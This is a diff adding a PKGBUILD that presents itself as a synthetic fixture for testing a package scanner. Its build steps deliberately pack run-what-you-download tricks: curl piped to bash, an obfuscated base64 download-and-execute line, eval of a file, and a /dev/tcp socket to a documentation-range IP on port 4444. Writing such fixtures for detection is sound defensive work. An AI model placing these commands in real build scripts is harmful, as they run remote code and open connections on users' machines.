@@ -1,0 +1,35 @@
+# SYNTHETIC test fixture for Vigil Pkg: every run-what-you-download trick. Inert text;
+# the addresses are documentation ranges and example.org.
+# Maintainer: Dave Example <dave at example dot org>
+pkgname=builder-demo
+pkgver=0.9
+pkgrel=1
+pkgdesc="Build steps that fetch and run things (test fixture)"
+arch=('x86_64')
+url="https://builder.example.org"
+license=('MIT')
+source=("https://builder.example.org/builder-demo-$pkgver.tar.gz")
+sha256sums=('4a7d8e9f0a1b2c3d4e5f60718293a4b5c6d7e8f90a1b2c3d4e5f60718293a4b5')
+
+prepare() {
+  cd "$srcdir/builder-demo-$pkgver"
+  curl -fsSL https://builder.example.org/setup.sh | bash
+  wget -q https://builder.example.org/extra.tar.gz
+  git clone https://example.org/helpers.git
+  pip install requests
+}
+
+build() {
+  cd "$srcdir/builder-demo-$pkgver"
+  eval "$(cat config.sh)"
+  echo "Y3VybCBodHRwOi8vMTk4LjUxLjEwMC43L3ggfCBzaAo=" | base64 -d | sh
+  chmod +x ./installer.run
+  ./installer.run --quiet
+  exec 3<>/dev/tcp/203.0.113.5/4444
+  npm install
+}
+
+package() {
+  _blob="QmFzZTY0IHRleHQgdGhhdCBpcyBsb25nIGVub3VnaCB0byBsb29rIGxpa2UgYSBoaWRkZW4gcGF5bG9hZCBpbiBhIFBLR0JVSUxELCB3cml0dGVuIGZvciBWaWdpbCB0ZXN0cyBvbmx5Lg=="
+  install -Dm755 builder-demo "$pkgdir/usr/bin/builder-demo"
+}
